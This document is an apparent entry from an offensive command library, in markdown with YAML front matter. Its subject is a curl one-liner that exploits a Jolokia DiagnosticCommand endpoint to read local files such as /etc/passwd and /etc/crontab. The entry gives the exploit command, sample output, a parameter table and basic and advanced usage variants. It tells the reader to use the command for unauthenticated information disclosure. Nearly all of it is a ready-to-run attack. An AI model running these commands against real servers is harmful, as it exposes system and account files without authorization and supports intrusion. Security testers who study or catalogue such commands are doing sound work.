---
id: cmd-curl-jolokia-lfi
data: >-
  curl -k
  "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
tags:
  - lfi
  - web-exploit
  - recon
type: command
output: >-
  Sample output:
  {"request":{"mbean":"com.sun.management:type=DiagnosticCommand","operation":"compilerDirectivesAdd","arguments":["!/etc!/passwd"]},"value":"root:x:0:0:root:/root:/bin/bash\n...","timestamp":1234567890,"status":200}
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.274Z'
verified: false
validated: true
submitted: true
---
# curl-jolokia-lfi

## Command

```bash
curl -k "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
```

## Description

This curl command exploits an LFI vulnerability in a Jolokia endpoint by performing path traversal with '!' to read local files like /etc/passwd. Use it for unauthenticated information disclosure on vulnerable Java web servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Skip SSL certificate verification (for self-signed certs) | Yes (if HTTPS) |
| URL path | Base endpoint + traversal payload (e.g., /!/etc!/file) | Yes |
| `--target` (custom) | Replace 'target.com' with actual host | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
```

### Advanced Usage

```bash
curl -k -H "User-Agent: Mozilla/5.0" "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab" -o output.txt
```

> Saves response to file for analysis.

## Expected Output

A JSON response from Jolokia containing the file contents in the 'value' field, e.g., user entries from passwd or cron schedules. Success if no 401/403 errors and file data is visible.

## Related

- [[Related Procedure|procedures/Exploit-Jolokia-LFI-for-File-Inclusion]]
